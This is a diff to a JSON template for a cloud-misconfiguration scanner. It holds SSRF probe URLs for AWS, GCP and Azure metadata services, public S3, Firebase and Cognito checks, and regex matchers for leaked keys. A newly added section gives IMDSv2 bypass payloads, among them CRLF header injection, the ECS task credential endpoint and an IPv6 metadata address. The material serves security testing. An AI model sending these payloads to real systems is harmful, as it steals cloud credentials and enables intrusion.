@@ -3,102 +3,425 @@
   "description": "Cloud-native web app misconfigurations and SDK error matchers (AWS, GCP, Azure, Firebase). Detects leaked credentials, public buckets, exposed metadata services, SAS-token misuse, and cloud-SDK error fingerprints in HTTP responses.",
   "contexts": {
     "aws_metadata_imdsv1": {
-      "description": "AWS EC2 IMDSv1 SSRF — token-less metadata service. Hits cleartext credentials.",
+      "description": "AWS EC2 IMDSv1 SSRF \u2014 token-less metadata service. Hits cleartext credentials.",
       "probes": [
-        {"payload": "http://169.254.169.254/latest/meta-data/iam/security-credentials/", "description": "List IAM role names available on this instance"},
-        {"payload": "http://169.254.169.254/latest/dynamic/instance-identity/document", "description": "Region, accountId, instanceId disclosure"},
-        {"payload": "http://169.254.169.254/latest/user-data", "description": "User-data script — often contains plaintext secrets"}
+        {
+          "payload": "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
+          "description": "List IAM role names available on this instance"
+        },
+        {
+          "payload": "http://169.254.169.254/latest/dynamic/instance-identity/document",
+          "description": "Region, accountId, instanceId disclosure"
+        },
+        {
+          "payload": "http://169.254.169.254/latest/user-data",
+          "description": "User-data script \u2014 often contains plaintext secrets"
+        }
       ],
       "matchers": [
-        {"type": "regex", "pattern": "AccessKeyId\\s*[\":=]+\\s*\"?ASIA[A-Z0-9]{16}", "weight": 100, "description": "Temporary AWS access key (ASIA prefix = STS-issued role creds)"},
-        {"type": "regex", "pattern": "AccessKeyId\\s*[\":=]+\\s*\"?AKIA[A-Z0-9]{16}", "weight": 100, "description": "Long-term AWS access key (AKIA prefix)"},
-        {"type": "literal", "pattern": "SecretAccessKey", "weight": 90, "description": "Field name from IAM credentials response"},
-        {"type": "regex", "pattern": "\"accountId\"\\s*:\\s*\"\\d{12}\"", "weight": 80, "description": "AWS account ID from instance-identity document"}
+        {
+          "type": "regex",
+          "pattern": "AccessKeyId\\s*[\":=]+\\s*\"?ASIA[A-Z0-9]{16}",
+          "weight": 100,
+          "description": "Temporary AWS access key (ASIA prefix = STS-issued role creds)"
+        },
+        {
+          "type": "regex",
+          "pattern": "AccessKeyId\\s*[\":=]+\\s*\"?AKIA[A-Z0-9]{16}",
+          "weight": 100,
+          "description": "Long-term AWS access key (AKIA prefix)"
+        },
+        {
+          "type": "literal",
+          "pattern": "SecretAccessKey",
+          "weight": 90,
+          "description": "Field name from IAM credentials response"
+        },
+        {
+          "type": "regex",
+          "pattern": "\"accountId\"\\s*:\\s*\"\\d{12}\"",
+          "weight": 80,
+          "description": "AWS account ID from instance-identity document"
+        }
       ]
     },
     "gcp_metadata": {
       "description": "GCP Compute metadata SSRF. Requires Metadata-Flavor: Google header.",
       "probes": [
-        {"payload": "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token", "description": "Default service account OAuth2 token", "headers": {"Metadata-Flavor": "Google"}},
-        {"payload": "http://metadata.google.internal/computeMetadata/v1/project/project-id", "description": "GCP project ID disclosure", "headers": {"Metadata-Flavor": "Google"}}
+        {
+          "payload": "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
+          "description": "Default service account OAuth2 token",
+          "headers": {
+            "Metadata-Flavor": "Google"
+          }
+        },
+        {
+          "payload": "http://metadata.google.internal/computeMetadata/v1/project/project-id",
+          "description": "GCP project ID disclosure",
+          "headers": {
+            "Metadata-Flavor": "Google"
+          }
+        }
       ],
       "matchers": [
-        {"type": "regex", "pattern": "\"access_token\"\\s*:\\s*\"ya29\\.[A-Za-z0-9_\\-]{30,}", "weight": 100, "description": "GCP OAuth2 access token (ya29. prefix)"},
-        {"type": "literal", "pattern": "projects/-/serviceAccounts/", "weight": 70, "description": "Service-account resource path leak"}
+        {
+          "type": "regex",
+          "pattern": "\"access_token\"\\s*:\\s*\"ya29\\.[A-Za-z0-9_\\-]{30,}",
+          "weight": 100,
+          "description": "GCP OAuth2 access token (ya29. prefix)"
+        },
+        {
+          "type": "literal",
+          "pattern": "projects/-/serviceAccounts/",
+          "weight": 70,
+          "description": "Service-account resource path leak"
+        }
       ]
     },
     "azure_imds": {
       "description": "Azure Instance Metadata SSRF. Requires Metadata: true header.",
       "probes": [
-        {"payload": "http://169.254.169.254/metadata/instance?api-version=2021-02-01", "description": "VM metadata", "headers": {"Metadata": "true"}},
-        {"payload": "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/", "description": "Managed Identity bearer token", "headers": {"Metadata": "true"}}
+        {
+          "payload": "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
+          "description": "VM metadata",
+          "headers": {
+            "Metadata": "true"
+          }
+        },
+        {
+          "payload": "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/",
+          "description": "Managed Identity bearer token",
+          "headers": {
+            "Metadata": "true"
+          }
+        }
       ],
       "matchers": [
-        {"type": "regex", "pattern": "\"azEnvironment\"\\s*:\\s*\"AzurePublicCloud\"", "weight": 100, "description": "Azure VM metadata signature"},
-        {"type": "regex", "pattern": "\"access_token\"\\s*:\\s*\"eyJ[A-Za-z0-9_\\-\\.]+\"", "weight": 95, "description": "Managed Identity JWT bearer token"},
-        {"type": "literal", "pattern": "subscriptionId", "weight": 60, "description": "Azure subscription ID field"}
+        {
+          "type": "regex",
+          "pattern": "\"azEnvironment\"\\s*:\\s*\"AzurePublicCloud\"",
+          "weight": 100,
+          "description": "Azure VM metadata signature"
+        },
+        {
+          "type": "regex",
+          "pattern": "\"access_token\"\\s*:\\s*\"eyJ[A-Za-z0-9_\\-\\.]+\"",
+          "weight": 95,
+          "description": "Managed Identity JWT bearer token"
+        },
+        {
+          "type": "literal",
+          "pattern": "subscriptionId",
+          "weight": 60,
+          "description": "Azure subscription ID field"
+        }
       ]
     },
     "s3_public_bucket": {
       "description": "AWS S3 bucket misconfig: public listing or public ACL.",
       "probes": [
-        {"payload": "?list-type=2", "description": "S3 v2 list-objects — public bucket dump"},
-        {"payload": "?acl", "description": "S3 ACL inspection — exposes grants"}
+        {
+          "payload": "?list-type=2",
+          "description": "S3 v2 list-objects \u2014 public bucket dump"
+        },
+        {
+          "payload": "?acl",
+          "description": "S3 ACL inspection \u2014 exposes grants"
+        }
       ],
       "matchers": [
-        {"type": "regex", "pattern": "<ListBucketResult\\s+xmlns=\"http://s3\\.amazonaws\\.com", "weight": 95, "description": "S3 public listing response"},
-        {"type": "regex", "pattern": "<URI>http://acs\\.amazonaws\\.com/groups/global/AllUsers</URI>", "weight": 100, "description": "S3 grant to AllUsers — fully public bucket"}
+        {
+          "type": "regex",
+          "pattern": "<ListBucketResult\\s+xmlns=\"http://s3\\.amazonaws\\.com",
+          "weight": 95,
+          "description": "S3 public listing response"
+        },
+        {
+          "type": "regex",
+          "pattern": "<URI>http://acs\\.amazonaws\\.com/groups/global/AllUsers</URI>",
+          "weight": 100,
+          "description": "S3 grant to AllUsers \u2014 fully public bucket"
+        }
       ]
     },
     "azure_sas_token_leak": {
       "description": "Azure SAS token leak in HTTP responses or JS bundles.",
       "probes": [],
       "matchers": [
-        {"type": "regex", "pattern": "\\?sv=\\d{4}-\\d{2}-\\d{2}&[a-z=&%\\d\\-]+&sig=[A-Za-z0-9%]+", "weight": 80, "description": "Azure Storage SAS query string"},
-        {"type": "regex", "pattern": "[a-z0-9]{3,24}\\.blob\\.core\\.windows\\.net/[A-Za-z0-9_\\-/\\.]+\\?sv=", "weight": 95, "description": "Full SAS URL — replay to test scope"}
+        {
+          "type": "regex",
+          "pattern": "\\?sv=\\d{4}-\\d{2}-\\d{2}&[a-z=&%\\d\\-]+&sig=[A-Za-z0-9%]+",
+          "weight": 80,
+          "description": "Azure Storage SAS query string"
+        },
+        {
+          "type": "regex",
+          "pattern": "[a-z0-9]{3,24}\\.blob\\.core\\.windows\\.net/[A-Za-z0-9_\\-/\\.]+\\?sv=",
+          "weight": 95,
+          "description": "Full SAS URL \u2014 replay to test scope"
+        }
       ]
     },
     "firebase_open_db": {
       "description": "Firebase Realtime Database with permissive read rules.",
       "probes": [
-        {"payload": "/.json", "description": "Root dump — works on default-allow rules"}
+        {
+          "payload": "/.json",
+          "description": "Root dump \u2014 works on default-allow rules"
+        }
       ],
       "matchers": [
-        {"type": "regex", "pattern": "Permission denied", "weight": -50, "description": "Negative — DB is rule-protected"},
-        {"type": "regex", "pattern": "^\\s*\\{[^}]*\"\\w+\"\\s*:", "weight": 75, "description": "JSON document root — likely DB dump"}
+        {
+          "type": "regex",
+          "pattern": "Permission denied",
+          "weight": -50,
+          "description": "Negative \u2014 DB is rule-protected"
+        },
+        {
+          "type": "regex",
+          "pattern": "^\\s*\\{[^}]*\"\\w+\"\\s*:",
+          "weight": 75,
+          "description": "JSON document root \u2014 likely DB dump"
+        }
       ]
     },
     "cognito_jwt": {
       "description": "AWS Cognito JWT signature.",
       "probes": [],
       "matchers": [
-        {"type": "regex", "pattern": "cognito-idp\\.[a-z0-9\\-]+\\.amazonaws\\.com/[a-z0-9_\\-]+", "weight": 70, "description": "Cognito User Pool issuer URL — extract User Pool ID"},
-        {"type": "regex", "pattern": "cognito-identity\\.[a-z0-9\\-]+\\.amazonaws\\.com", "weight": 70, "description": "Cognito Identity Pool — test GetCredentialsForIdentity"},
-        {"type": "literal", "pattern": "cognito:groups", "weight": 60, "description": "Cognito group claim — tamper for privilege escalation"}
+        {
+          "type": "regex",
+          "pattern": "cognito-idp\\.[a-z0-9\\-]+\\.amazonaws\\.com/[a-z0-9_\\-]+",
+          "weight": 70,
+          "description": "Cognito User Pool issuer URL \u2014 extract User Pool ID"
+        },
+        {
+          "type": "regex",
+          "pattern": "cognito-identity\\.[a-z0-9\\-]+\\.amazonaws\\.com",
+          "weight": 70,
+          "description": "Cognito Identity Pool \u2014 test GetCredentialsForIdentity"
+        },
+        {
+          "type": "literal",
+          "pattern": "cognito:groups",
+          "weight": 60,
+          "description": "Cognito group claim \u2014 tamper for privilege escalation"
+        }
       ]
     },
     "leaked_keys_in_response": {
       "description": "Plaintext cloud credentials in HTTP responses (often via debug pages, error stacks, or HTML).",
       "probes": [],
       "matchers": [
-        {"type": "regex", "pattern": "AKIA[0-9A-Z]{16}", "weight": 100, "description": "AWS long-term access key in response body"},
-        {"type": "regex", "pattern": "ASIA[0-9A-Z]{16}", "weight": 100, "description": "AWS STS temporary key"},
-        {"type": "regex", "pattern": "AIza[0-9A-Za-z\\-_]{35}", "weight": 95, "description": "Google API key"},
-        {"type": "regex", "pattern": "ya29\\.[0-9A-Za-z\\-_]{30,}", "weight": 100, "description": "GCP OAuth2 access token"},
-        {"type": "regex", "pattern": "DefaultEndpointsProtocol=https;AccountName=[a-z0-9]+;AccountKey=[A-Za-z0-9+/=]+", "weight": 100, "description": "Azure Storage connection string"},
-        {"type": "regex", "pattern": "-----BEGIN PRIVATE KEY-----", "weight": 95, "description": "Private key (often GCP service-account JSON)"}
+        {
+          "type": "regex",
+          "pattern": "AKIA[0-9A-Z]{16}",
+          "weight": 100,
+          "description": "AWS long-term access key in response body"
+        },
+        {
+          "type": "regex",
+          "pattern": "ASIA[0-9A-Z]{16}",
+          "weight": 100,
+          "description": "AWS STS temporary key"
+        },
+        {
+          "type": "regex",
+          "pattern": "AIza[0-9A-Za-z\\-_]{35}",
+          "weight": 95,
+          "description": "Google API key"
+        },
+        {
+          "type": "regex",
+          "pattern": "ya29\\.[0-9A-Za-z\\-_]{30,}",
+          "weight": 100,
+          "description": "GCP OAuth2 access token"
+        },
+        {
+          "type": "regex",
+          "pattern": "DefaultEndpointsProtocol=https;AccountName=[a-z0-9]+;AccountKey=[A-Za-z0-9+/=]+",
+          "weight": 100,
+          "description": "Azure Storage connection string"
+        },
+        {
+          "type": "regex",
+          "pattern": "-----BEGIN PRIVATE KEY-----",
+          "weight": 95,
+          "description": "Private key (often GCP service-account JSON)"
+        }
       ]
     },
     "cloud_sdk_errors": {
-      "description": "Cloud SDK error fingerprints disclosed in error pages — confirms backend cloud usage.",
+      "description": "Cloud SDK error fingerprints disclosed in error pages \u2014 confirms backend cloud usage.",
       "probes": [],
       "matchers": [
-        {"type": "literal", "pattern": "AccessDenied", "weight": 30, "description": "AWS access denied — endpoint touches AWS"},
-        {"type": "literal", "pattern": "InvalidAccessKeyId", "weight": 50, "description": "AWS error — backend auth failure leak"},
-        {"type": "literal", "pattern": "SignatureDoesNotMatch", "weight": 50, "description": "AWS SigV4 signature mismatch"},
-        {"type": "literal", "pattern": "google.api_core.exceptions", "weight": 60, "description": "GCP Python SDK stack trace"},
-        {"type": "literal", "pattern": "Microsoft.WindowsAzure.Storage", "weight": 60, "description": "Azure Storage SDK stack trace"},
-        {"type": "literal", "pattern": "ServerErrorException: 0:Permission", "weight": 60, "description": "Firebase Admin SDK error"}
+        {
+          "type": "literal",
+          "pattern": "AccessDenied",
+          "weight": 30,
+          "description": "AWS access denied \u2014 endpoint touches AWS"
+        },
+        {
+          "type": "literal",
+          "pattern": "InvalidAccessKeyId",
+          "weight": 50,
+          "description": "AWS error \u2014 backend auth failure leak"
+        },
+        {
+          "type": "literal",
+          "pattern": "SignatureDoesNotMatch",
+          "weight": 50,
+          "description": "AWS SigV4 signature mismatch"
+        },
+        {
+          "type": "literal",
+          "pattern": "google.api_core.exceptions",
+          "weight": 60,
+          "description": "GCP Python SDK stack trace"
+        },
+        {
+          "type": "literal",
+          "pattern": "Microsoft.WindowsAzure.Storage",
+          "weight": 60,
+          "description": "Azure Storage SDK stack trace"
+        },
+        {
+          "type": "literal",
+          "pattern": "ServerErrorException: 0:Permission",
+          "weight": 60,
+          "description": "Firebase Admin SDK error"
+        }
+      ]
+    },
+    "aws_imdsv2_bypass": {
+      "description": "AWS IMDSv2 requires PUT /latest/api/token with X-aws-ec2-metadata-token-ttl-seconds before GET. Older SDK-driven SSRF bugs assumed GET-only; modern SSRF to IMDSv2 needs the PUT to succeed too. Bypasses: (1) SSRF that allows arbitrary HTTP method -> attacker performs PUT then GET, (2) SSRF in a service that fetches headers from upstream + reflects them -> CRLF inject the X-aws-ec2-metadata-token, (3) container-running-as-root where AWS_CONTAINER_CREDENTIALS_RELATIVE_URI is set and proxies to 169.254.170.2 (ECS/Fargate Task IAM) which is GET-only.",
+      "tech_match": [
+        "aws",
+        "ec2",
+        "ecs",
+        "fargate"
+      ],
+      "param_match": [
+        "url",
+        "image_url",
+        "webhook",
+        "callback",
+        "import_url"
+      ],
+      "probes": [
+        {
+          "payload": "http://169.254.169.254/latest/api/token",
+          "description": "PUT to IMDSv2 token endpoint. If SSRF lets caller set method=PUT and header X-aws-ec2-metadata-token-ttl-seconds:21600, server returns a 56-char token. Detection only -- token is short-lived and read-only without further exfil step.",
+          "matchers": [
+            {
+              "type": "status",
+              "status": [
+                200
+              ]
+            },
+            {
+              "type": "regex",
+              "pattern": "^[A-Za-z0-9+/=_-]{40,}$"
+            }
+          ],
+          "severity": "high",
+          "confidence_boost": 55,
+          "variables": {
+            "method": "PUT",
+            "headers": {
+              "X-aws-ec2-metadata-token-ttl-seconds": "21600"
+            }
+          }
+        },
+        {
+          "payload": "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
+          "description": "GET role list with X-aws-ec2-metadata-token header from step 1. If SSRF only allows GET and no header injection, IMDSv2 blocks. With token header, role names leak.",
+          "matchers": [
+            {
+              "type": "status",
+              "status": [
+                200
+              ]
+            },
+            {
+              "type": "word",
+              "any": [
+                "role",
+                "instance",
+                "profile"
+              ]
+            }
+          ],
+          "severity": "critical",
+          "confidence_boost": 65,
+          "variables": {
+            "method": "GET",
+            "headers": {
+              "X-aws-ec2-metadata-token": "{{imdsv2_token}}"
+            }
+          }
+        },
+        {
+          "payload": "http://169.254.169.254/latest/meta-data/iam/security-credentials/<ROLE>\r\nX-aws-ec2-metadata-token: ABC",
+          "description": "CRLF injection in URL path -- some HTTP clients (older Java URLConnection, naive Go http.NewRequest) let CRLF in URL inject a header. If the target HTTP client sends the injected header verbatim, IMDSv2 token check passes without a real PUT.",
+          "matchers": [
+            {
+              "type": "word",
+              "any": [
+                "AccessKeyId",
+                "SecretAccessKey",
+                "Token"
+              ]
+            }
+          ],
+          "severity": "critical",
+          "confidence_boost": 70
+        },
+        {
+          "payload": "http://169.254.170.2/v2/credentials/<random>",
+          "description": "ECS/Fargate Task IAM endpoint (AWS_CONTAINER_CREDENTIALS_RELATIVE_URI). Plain GET, no token. If SSRF reaches a containerised app, this is GET-only IMDSv1 equivalent that survives IMDSv2 hardening. Replace <random> with the value from env if leaked, or fuzz common task IDs.",
+          "matchers": [
+            {
+              "type": "status",
+              "status": [
+                200
+              ]
+            },
+            {
+              "type": "word",
+              "any": [
+                "AccessKeyId",
+                "SecretAccessKey",
+                "Token",
+                "RoleArn"
+              ]
+            }
+          ],
+          "severity": "critical",
+          "confidence_boost": 70
+        },
+        {
+          "payload": "http://[fd00:ec2::254]/latest/meta-data/",
+          "description": "IPv6 IMDS endpoint (fd00:ec2::254) -- often missing from SSRF deny-lists that only block 169.254.169.254. Some EC2 AMIs ship with IMDS IPv6 enabled by default.",
+          "matchers": [
+            {
+              "type": "status",
+              "status": [
+                200
+              ]
+            },
+            {
+              "type": "word",
+              "any": [
+                "ami-id",
+                "instance-id",
+                "meta-data"
+              ]
+            }
+          ],
+          "severity": "critical",
+          "confidence_boost": 65
+        }
       ]
     }
   }
